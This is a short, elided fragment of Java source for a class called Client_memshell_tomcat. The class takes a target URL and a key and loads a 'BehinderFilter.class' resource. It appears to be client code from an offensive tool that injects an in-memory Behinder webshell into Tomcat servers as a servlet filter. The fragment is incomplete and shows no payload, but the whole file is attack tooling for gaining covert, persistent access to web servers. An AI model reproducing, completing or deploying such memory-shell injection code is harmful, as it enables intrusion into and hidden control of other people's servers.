...
public class Client_memshell_tomcat {
    public static void main(String vurl, String vkey) throws Exception {
        System.out.println("type: tomcat");
        ...
        String url = vurl;
        URI uri = Objects.requireNonNull(Client_memshell_tomcat.class.getResource("BehinderFilter.class")).toURI();

        Resolver.resolve("BehinderFilter.class");
